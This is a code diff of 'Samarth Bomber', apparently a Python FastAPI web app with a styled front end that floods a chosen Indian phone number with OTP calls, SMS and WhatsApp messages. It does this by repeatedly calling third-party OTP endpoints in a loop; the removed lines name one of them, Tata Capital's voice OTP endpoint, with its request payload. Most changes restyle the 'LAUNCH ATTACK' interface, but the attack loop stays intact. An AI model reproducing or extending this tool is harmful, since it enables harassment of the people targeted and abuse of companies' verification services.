@@ -12,15 +12,13 @@ class Phone(BaseModel):
     phone: str
 
 ULTIMATE_APIS = [
-    # Paste all your APIs here (same as before)
-    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
-    # ... add rest
+    # Paste ALL your APIs here
 ]
 
 attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}
 
 def add_log(msg):
-    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
+    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} → {msg}")
     if len(attack_status["logs"]) > 25: attack_status["logs"].pop()
 
 async def hit_api(session, api, phone):
@@ -38,15 +36,15 @@ async def run_attack(phone):
     attack_status["phone"] = phone
     attack_status["cycles"] = 0
     attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
-    add_log(f"Attack launched on +91{phone}")
+    add_log("ATTACK INITIALIZED")
     async with aiohttp.ClientSession() as session:
         while attack_status["running"]:
             attack_status["cycles"] += 1
             tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
             await asyncio.gather(*tasks, return_exceptions=True)
-            add_log(f"Cycle {attack_status['cycles']} fired")
+            add_log(f"Cycle {attack_status['cycles']} | APIs Fired")
             await asyncio.sleep(2)
-    add_log("Attack stopped")
+    add_log("ATTACK TERMINATED")
     attack_status["running"] = False
 
 @app.get("/", response_class=HTMLResponse)
@@ -57,143 +55,118 @@ async def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samarth Bomber</title>
+    <title>Samarth Bomber • Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body {
-            background: linear-gradient(135deg, #0a1428, #1a2338);
-            font-family: 'Inter', sans-serif;
-        }
-        .neon-blue {
-            text-shadow: 0 0 10px #3b82f6, 0 0 20px #3b82f6, 0 0 40px #60a5fa;
-        }
-        .glass {
-            background: rgba(15, 23, 42, 0.85);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-        }
-        .btn-neon {
-            transition: all 0.3s;
-        }
-        .btn-neon:hover {
-            box-shadow: 0 0 25px #3b82f6, 0 0 50px #60a5fa;
-            transform: translateY(-2px);
-        }
-        .attack-active {
-            animation: neon-pulse 1.5s infinite alternate;
-        }
-        @keyframes neon-pulse {
-            from { box-shadow: 0 0 10px #3b82f6; }
-            to { box-shadow: 0 0 30px #3b82f6, 0 0 60px #60a5fa; }
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
+        body { background: #05080f; font-family: 'Inter', sans-serif; }
+        .title { font-family: 'Space Grotesk', sans-serif; }
+        .neon { text-shadow: 0 0 15px #22d3ee, 0 0 30px #22d3ee, 0 0 50px #67e8f9; }
+        .glass { background: rgba(10, 15, 35, 0.92); backdrop-filter: blur(20px); border: 1px solid rgba(103, 232, 249, 0.25); }
+        .glow-btn { transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .glow-btn:hover { box-shadow: 0 0 35px #22d3ee, 0 0 70px #67e8f9; transform: scale(1.03); }
+        .log-line { animation: fadeIn 0.4s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="text-white min-h-screen pb-12">
-    <div class="max-w-lg mx-auto p-4">
-        <!-- Header -->
-        <div class="flex justify-between items-center mb-8 mt-6">
+<body class="text-slate-200 min-h-screen">
+    <div class="max-w-md mx-auto px-4 py-8">
+        <!-- Top Bar -->
+        <div class="flex items-center justify-between mb-10">
             <div class="flex items-center gap-3">
-                <div class="w-11 h-11 bg-blue-600 rounded-2xl flex items-center justify-center text-3xl shadow-lg shadow-blue-500/50">⚡</div>
+                <div class="w-10 h-10 bg-cyan-500 rounded-2xl flex items-center justify-center text-2xl shadow-[0_0_25px_#22d3ee]">⚡</div>
                 <div>
-                    <h1 class="text-4xl font-bold tracking-tighter neon-blue">SAMARTH</h1>
-                    <p class="text-blue-400 text-sm -mt-1">BOMBER v2.0</p>
+                    <h1 class="title text-4xl font-bold tracking-tighter neon text-white">SAMARTH</h1>
+                    <p class="text-cyan-400 text-xs tracking-[3px] -mt-1">BOMBER PRO</p>
                 </div>
             </div>
-            <div id="status" class="px-4 py-1 bg-emerald-500/10 text-emerald-400 text-xs font-mono rounded-full border border-emerald-500/30">READY</div>
+            <div id="status" class="text-xs font-mono px-5 py-2 bg-emerald-900/30 border border-emerald-500/50 rounded-full text-emerald-400">SYSTEM ONLINE</div>
         </div>
 
-        <!-- Main Card -->
-        <div class="glass rounded-3xl p-6 mb-6">
-            <div class="text-center mb-6">
-                <h2 class="text-2xl font-semibold neon-blue">TARGET NUMBER</h2>
+        <div class="glass rounded-3xl p-8 shadow-2xl shadow-cyan-500/10">
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center gap-2 bg-cyan-950 text-cyan-300 text-sm px-6 py-2 rounded-3xl border border-cyan-400/30">
+                    <div class="w-2 h-2 bg-cyan-400 rounded-full animate-pulse"></div>
+                    TARGET ACQUIRED
+                </div>
             </div>
-            <input id="phone" maxlength="10" 
-                   class="w-full bg-zinc-900 border border-blue-500/50 focus:border-blue-400 rounded-2xl px-6 py-5 text-3xl font-mono text-center tracking-widest outline-none" 
-                   placeholder="9876543210" type="tel">
 
-            <div class="grid grid-cols-2 gap-4 mt-8">
+            <input id="phone" maxlength="10" 
+                   class="w-full bg-zinc-950 border border-cyan-500/40 focus:border-cyan-400 rounded-2xl px-8 py-7 text-4xl font-mono text-center tracking-widest outline-none transition-all" 
+                   placeholder="98XXXXXXXX" type="tel">
+
+            <div class="mt-10 grid grid-cols-2 gap-4">
                 <button onclick="startAttack()" id="startBtn"
-                        class="btn-neon bg-blue-600 hover:bg-blue-700 py-6 rounded-2xl text-lg font-bold flex items-center justify-center gap-2 shadow-xl">
-                    🚀 START BOOM
+                        class="glow-btn bg-gradient-to-r from-cyan-500 to-blue-600 py-7 rounded-2xl text-xl font-semibold shadow-xl flex items-center justify-center gap-3">
+                    <span>LAUNCH ATTACK</span> 🚀
                 </button>
-                <button onclick="stopAttack()" id="stopBtn" class="hidden btn-neon bg-red-600 hover:bg-red-700 py-6 rounded-2xl text-lg font-bold">
-                    🛑 STOP
+                <button onclick="stopAttack()" id="stopBtn" class="hidden glow-btn bg-red-600/90 hover:bg-red-600 py-7 rounded-2xl text-xl font-semibold">
+                    TERMINATE
                 </button>
             </div>
         </div>
 
         <!-- Stats -->
-        <div class="glass rounded-3xl p-6 mb-6">
-            <h3 class="text-blue-400 text-center mb-5 text-sm tracking-widest">LIVE ATTACK STATS</h3>
-            <div class="grid grid-cols-3 gap-4 text-center">
-                <div class="bg-zinc-900/70 rounded-2xl p-4">
-                    <div id="calls" class="text-4xl font-bold text-orange-400">0</div>
-                    <div class="text-xs text-slate-400">CALLS</div>
+        <div class="glass rounded-3xl p-8 mt-6">
+            <h3 class="text-cyan-400 text-xs tracking-widest mb-6 text-center">ATTACK METRICS</h3>
+            <div class="grid grid-cols-3 gap-4">
+                <div class="text-center">
+                    <div id="calls" class="text-5xl font-bold text-orange-400">0</div>
+                    <div class="text-[10px] text-slate-400 mt-1">CALLS</div>
                 </div>
-                <div class="bg-zinc-900/70 rounded-2xl p-4">
-                    <div id="sms" class="text-4xl font-bold text-blue-400">0</div>
-                    <div class="text-xs text-slate-400">SMS</div>
+                <div class="text-center">
+                    <div id="sms" class="text-5xl font-bold text-sky-400">0</div>
+                    <div class="text-[10px] text-slate-400 mt-1">SMS</div>
                 </div>
-                <div class="bg-zinc-900/70 rounded-2xl p-4">
-                    <div id="wa" class="text-4xl font-bold text-green-400">0</div>
-                    <div class="text-xs text-slate-400">WA</div>
+                <div class="text-center">
+                    <div id="wa" class="text-5xl font-bold text-emerald-400">0</div>
+                    <div class="text-[10px] text-slate-400 mt-1">WHATSAPP</div>
                 </div>
             </div>
-            <div class="mt-6">
-                <div class="flex justify-between text-xs mb-2 text-slate-400">
-                    <span>CYCLES</span>
-                    <span id="cycles">0</span>
+            <div class="mt-8">
+                <div class="flex justify-between text-xs mb-3">
+                    <span class="text-slate-400">CYCLES COMPLETED</span>
+                    <span id="cycles" class="font-mono text-cyan-300">0</span>
                 </div>
-                <div class="h-2 bg-zinc-800 rounded-full overflow-hidden">
-                    <div id="progress" class="h-2 bg-gradient-to-r from-blue-400 to-cyan-400 w-0 transition-all"></div>
+                <div class="h-1.5 bg-zinc-900 rounded-full">
+                    <div id="progress" class="h-1.5 bg-gradient-to-r from-cyan-400 via-blue-400 to-sky-400 rounded-full w-0 transition-all duration-700"></div>
                 </div>
             </div>
         </div>
 
         <!-- Logs -->
-        <div class="glass rounded-3xl p-6">
-            <h3 class="text-blue-400 mb-4 text-sm tracking-widest">LIVE LOGS</h3>
-            <div id="logs" class="font-mono text-xs h-64 overflow-y-auto bg-black/40 p-4 rounded-2xl text-slate-300 space-y-1"></div>
+        <div class="glass rounded-3xl p-8 mt-6">
+            <div class="flex items-center justify-between mb-5">
+                <h3 class="text-cyan-400 text-xs tracking-widest">LIVE CONSOLE</h3>
+                <div class="text-[10px] text-slate-500">REAL-TIME</div>
+            </div>
+            <div id="logs" class="font-mono text-xs h-64 overflow-y-auto bg-black/60 p-5 rounded-2xl text-slate-300 space-y-2"></div>
         </div>
 
-        <div class="text-center text-xs text-slate-500 mt-8">
-            Made by Samarth • Mobile Optimized
-        </div>
+        <div class="text-center text-[10px] text-slate-600 mt-10">© SAMARTH • PRO EDITION</div>
     </div>
 
     <script>
         let isRunning = false;
-
         async function startAttack() {
             const phone = document.getElementById("phone").value.trim();
-            if (phone.length !== 10) return alert("Enter valid 10 digit Indian number");
-            
-            const res = await fetch("/start", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({phone})
-            });
-            const data = await res.json();
-            if (data.status === "success") {
+            if (phone.length !== 10) return alert("Enter valid 10-digit number");
+            const res = await fetch("/start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone})});
+            if ((await res.json()).status === "success") {
                 isRunning = true;
                 document.getElementById("startBtn").classList.add("hidden");
                 document.getElementById("stopBtn").classList.remove("hidden");
-                document.getElementById("status").textContent = "ATTACKING";
-                document.getElementById("status").classList.add("animate-pulse");
+                document.getElementById("status").innerHTML = `ATTACKING +91${phone} <span class="animate-pulse">●</span>`;
                 pollStatus();
             }
         }
-
         async function stopAttack() {
-            await fetch("/stop", {method: "POST"});
+            await fetch("/stop", {method:"POST"});
             isRunning = false;
             document.getElementById("startBtn").classList.remove("hidden");
             document.getElementById("stopBtn").classList.add("hidden");
-            document.getElementById("status").textContent = "STOPPED";
-            document.getElementById("status").classList.remove("animate-pulse");
+            document.getElementById("status").textContent = "SYSTEM ONLINE";
         }
-
         function pollStatus() {
             if (!isRunning) return;
             fetch("/status").then(r => r.json()).then(d => {
@@ -201,13 +174,12 @@ async def index():
                 document.getElementById("sms").textContent = d.stats.SMS || 0;
                 document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
                 document.getElementById("cycles").textContent = d.cycles;
-                document.getElementById("progress").style.width = Math.min((d.cycles * 7) % 100 + 25, 100) + "%";
+                document.getElementById("progress").style.width = Math.min(d.cycles * 8 % 100 + 30, 100) + "%";
                 
                 const logsDiv = document.getElementById("logs");
-                logsDiv.innerHTML = d.logs.map(l => `<div>${l}</div>`).join('');
+                logsDiv.innerHTML = d.logs.map(l => `<div class="log-line">${l}</div>`).join('');
                 logsDiv.scrollTop = logsDiv.scrollHeight;
-                
-                setTimeout(pollStatus, 1400);
+                setTimeout(pollStatus, 1300);
             });
         }
     </script>
@@ -216,6 +188,7 @@ async def index():
     """
     return html
 
+# Routes same as before
 @app.post("/start")
 async def start(phone: Phone):
     if len(phone.phone) != 10: return {"status": "error"}
